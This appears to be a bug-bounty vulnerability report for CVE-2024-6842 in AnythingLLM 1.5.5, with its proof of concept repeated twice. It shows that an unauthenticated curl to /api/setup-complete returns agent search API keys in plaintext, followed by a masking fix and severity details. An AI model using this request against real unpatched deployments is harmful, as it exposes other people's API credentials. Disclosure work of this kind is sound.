@@ -1,0 +1,68 @@
+Title: Exposure sensitive info via specific API in mintplex-labs/anything-llm
+
+Proof of Concept: 
+Set those api keys in .env file
+AGENT_GSE_CTX='bbbbbbbbbbbbbbbb'
+AGENT_GSE_KEY='aaaaaaaaaaaaaaaa'
+AGENT_SERPER_DEV_KEY='cccccccccccccccc'
+AGENT_BING_SEARCH_API_KEY='dddddddddddddddddddd'
+Launch AnythingLLM in local docker
+docker run -d -p 3001:3001 \
+-v ${STORAGE_LOCATION}:/app/server/storage \
+-v ${STORAGE_LOCATION}/.env:/app/server/.env \
+-e STORAGE_DIR="/app/server/storage" \
+mintplexlabs/anythingllm
+Access /setup-complete to retrieve the sensitive information
+curl http://localhost:3001/api/setup-complete
+
+# {"results":{"RequiresAuth":true,"AuthToken":true,"JWTSecret":true,"StorageDir":"/app/server/storage","MultiUserMode":false,"DisableTelemetry":"false","EmbeddingEngine":"native","HasExistingEmbeddings":false,"HasCachedEmbeddings":false,"VectorDB":"lancedb","PineConeKey":false,"ChromaApiKey":false,"MilvusPassword":false,"LLMProvider":"openai","OpenAiKey":true,"OpenAiModelPref":"gpt-4o","AzureOpenAiKey":false,"AzureOpenAiTokenLimit":4096,"AnthropicApiKey":false,"AnthropicModelPref":"claude-2","GeminiLLMApiKey":false,"GeminiLLMModelPref":"gemini-pro","GeminiSafetySetting":"BLOCK_MEDIUM_AND_ABOVE","LocalAiApiKey":false,"TogetherAiApiKey":false,"PerplexityApiKey":false,"OpenRouterApiKey":false,"MistralApiKey":false,"GroqApiKey":false,"HuggingFaceLLMAccessToken":false,"TextGenWebUIAPIKey":false,"LiteLLMApiKey":false,"GenericOpenAiKey":false,"CohereApiKey":false,"VoyageAiApiKey":false,"WhisperProvider":"local","WhisperModelPref":"Xenova/whisper-small","TextToSpeechProvider":"native","TTSOpenAIKey":false,"TTSElevenLabsKey":false,"AgentGoogleSearchEngineId":"bbbbbbbbbbbbbbbb","AgentGoogleSearchEngineKey":"aaaaaaaaaaaaaaaa","AgentSerperApiKey":"cccccccccccccccc","AgentBingSearchApiKey":"dddddddddddddddddddd"}}
+
+Fix Suggestion
+Mask the Api key:
+AgentGoogleSearchEngineId: !!process.env.AGENT_GSE_CTX
+AgentGoogleSearchEngineKey: !!process.env.AGENT_GSE_KEY
+AgentSerperApiKey: !!process.env.AGENT_SERPER_DEV_KEY
+AgentBingSearchApiKey: !!process.env.AGENT_BING_SEARCH_API_KEY
+
+Set those api keys in .env file
+
+AGENT_GSE_CTX='bbbbbbbbbbbbbbbb'
+AGENT_GSE_KEY='aaaaaaaaaaaaaaaa'
+AGENT_SERPER_DEV_KEY='cccccccccccccccc'
+AGENT_BING_SEARCH_API_KEY='dddddddddddddddddddd'
+
+Launch AnythingLLM in local docker
+
+docker run -d -p 3001:3001 \
+-v ${STORAGE_LOCATION}:/app/server/storage \
+-v ${STORAGE_LOCATION}/.env:/app/server/.env \
+-e STORAGE_DIR="/app/server/storage" \
+mintplexlabs/anythingllm
+
+Access /setup-complete to retrieve the sensitive information
+
+curl http://localhost:3001/api/setup-complete
+
+# {"results":{"RequiresAuth":true,"AuthToken":true,"JWTSecret":true,"StorageDir":"/app/server/storage","MultiUserMode":false,"DisableTelemetry":"false","EmbeddingEngine":"native","HasExistingEmbeddings":false,"HasCachedEmbeddings":false,"VectorDB":"lancedb","PineConeKey":false,"ChromaApiKey":false,"MilvusPassword":false,"LLMProvider":"openai","OpenAiKey":true,"OpenAiModelPref":"gpt-4o","AzureOpenAiKey":false,"AzureOpenAiTokenLimit":4096,"AnthropicApiKey":false,"AnthropicModelPref":"claude-2","GeminiLLMApiKey":false,"GeminiLLMModelPref":"gemini-pro","GeminiSafetySetting":"BLOCK_MEDIUM_AND_ABOVE","LocalAiApiKey":false,"TogetherAiApiKey":false,"PerplexityApiKey":false,"OpenRouterApiKey":false,"MistralApiKey":false,"GroqApiKey":false,"HuggingFaceLLMAccessToken":false,"TextGenWebUIAPIKey":false,"LiteLLMApiKey":false,"GenericOpenAiKey":false,"CohereApiKey":false,"VoyageAiApiKey":false,"WhisperProvider":"local","WhisperModelPref":"Xenova/whisper-small","TextToSpeechProvider":"native","TTSOpenAIKey":false,"TTSElevenLabsKey":false,"AgentGoogleSearchEngineId":"bbbbbbbbbbbbbbbb","AgentGoogleSearchEngineKey":"aaaaaaaaaaaaaaaa","AgentSerperApiKey":"cccccccccccccccc","AgentBingSearchApiKey":"dddddddddddddddddddd"}}
+
+Impact: 
+Api key leaking.
+
+CVE ID: CVE-2024-6842
+Status: (assigned)
+Vulnerability Type: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
+Severity: High (7.5)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: High
+Integrity: None
+Availability: None
+Registry: Other
+Affected Version: 1.5.5
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $450
+Fix Bounty: $112.5
